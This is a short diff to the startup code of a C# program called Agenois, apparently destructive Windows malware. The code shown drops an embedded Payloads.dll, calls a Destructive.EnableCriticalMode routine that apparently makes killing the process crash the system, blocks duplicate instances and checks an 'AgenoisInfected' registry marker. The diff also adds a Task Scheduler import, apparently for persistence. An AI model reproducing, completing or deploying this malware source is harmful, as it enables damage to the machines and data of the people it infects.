@@ -12,6 +12,7 @@ using Agenois.Properties;
 using Agenois.Payloads;
 using Agenois.Utils;
 using System.Media;
+using Microsoft.Win32.TaskScheduler;
 
 namespace Agenois
 {
@@ -28,13 +29,11 @@ namespace Agenois
                 File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
             }
             catch { }
-            
-            //Everything on startup.
 
             Destructive.EnableCriticalMode();
-
+            
             RegistryKey editKey;
-
+            
             if (Process.GetProcessesByName("Agenois").Count() > 1) { Environment.Exit(0); }
 
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
